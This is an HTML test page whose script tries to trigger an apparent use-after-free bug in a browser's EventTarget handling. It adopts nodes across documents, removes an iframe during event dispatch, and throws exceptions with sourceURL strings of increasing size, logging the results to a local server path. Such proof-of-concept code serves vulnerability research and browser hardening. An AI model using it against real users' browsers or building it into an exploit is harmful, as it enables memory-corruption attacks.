<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>EventTarget Test</title></head>
<body>
<div id="log"></div>
<script>
var el = document.getElementById('log');
function log(m) {
    var d = document.createElement('div');
    d.textContent = m;
    el.appendChild(d);
    try { var x = new XMLHttpRequest(); x.open('GET','/log?m='+encodeURIComponent(m),false); x.send(); } catch(e) {}
}

log('=== EventTarget UAF Test (sized strings) ===');

// Test with different string sizes to find the UAF trigger
var sizes = [1024, 1024*10, 1024*100, 1024*1024, 1024*1024*4, 1024*1024*32];

for (var s = 0; s < sizes.length; s++) {
    var sz = sizes[s];
    log('TEST: sourceURL size = ' + (sz/1024) + 'KB');
    
    try {
        var f = document.body.appendChild(document.createElement('iframe'));
        var a = document.createElement('div');
        var b = a.appendChild(document.createElement('div'));
        
        var triggered = false;
        a.addEventListener('a', function() {
            if (triggered) return;
            triggered = true;
            try { document.adoptNode(a); } catch(e) {}
            try { f.remove(); } catch(e) {}
            throw { line:1, column:1, sourceURL: 'A'.repeat(sz) };
        });
        a.addEventListener('a', function() {});
        b.addEventListener('a', function() {
            try { f.contentDocument.adoptNode(a); } catch(e) {}
        });
        
        b.dispatchEvent(new Event('a', { bubbles: true }));
        log('SURVIVED size ' + (sz/1024) + 'KB!');
    } catch(e) {
        log('Exception at size ' + (sz/1024) + 'KB: ' + e.constructor.name + ': ' + (e.message||'').substring(0,50));
    }
}

log('=== DONE ===');
</script>
</body>
</html>
